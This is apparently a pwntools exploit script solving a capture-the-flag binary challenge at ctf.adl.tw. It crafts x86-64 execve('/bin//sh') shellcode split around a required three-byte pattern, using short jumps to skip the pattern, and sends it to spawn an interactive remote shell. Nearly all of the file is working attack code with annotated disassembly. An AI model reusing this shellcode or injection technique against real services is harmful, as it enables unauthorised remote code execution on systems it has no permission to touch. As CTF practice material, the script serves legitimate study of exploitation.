from pwn import *

p = remote("ctf.adl.tw", 10003)

""" Illustration
* Space of local vars has 224 bytes, first byte is at rbp-0xe0
* There are two restrictions in order to simulate canary:
- Restriction one: The values of buf[i*20], buf[i*20+1], buf[i*20+2] must be respectively \x0c \x87 \x63
- Restriction two: The values cannot be \x90
* Must ensure that \x0c \x87 \x63 is used to form a valid instruction set
* Use Jump Short to bypass rest of \x0c \x87 \x63, better then Jump Near
* Note that Next_Instruction_Address = JMP_Address + 2 + Second_Byte_value for short jump
Illustration """

# 20 bytes a frame
frame = b"\x0c\x87\x63" + b'\x01' * 17

# 0 ~ 3rd bytes
head = b"\x0c\x87\x63\xd0"
""" Instruction
0c 87                   or    al, 0x87
63 d0                   movsxd edx, eax
Instruction """

# 4 ~ 19th bytes
shellcode_sys_exeve_part1 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\x04"
""" Instruction
48 31 f6                xor    rsi, rsi
56                      push   rsi
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
eb 04                   jmp short +0x4  # (jmp short 0x4), jump to buf[24]
Instruction """

# 24 ~ 32th bytes
shellcode_sys_exeve_part2 = b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
""" Instruction
57                      push   rdi
54                      push   rsp
5f                      pop    rdi
6a 3b                   push   0x3b
58                      pop    rax
99                      cdq
0f 05                   syscall
Instruction """

tail_ = b'\x01' * 7 + frame * 8

payload =  head + shellcode_sys_exeve_part1 + head + shellcode_sys_exeve_part2 + tail_

p.send(payload)

p.interactive()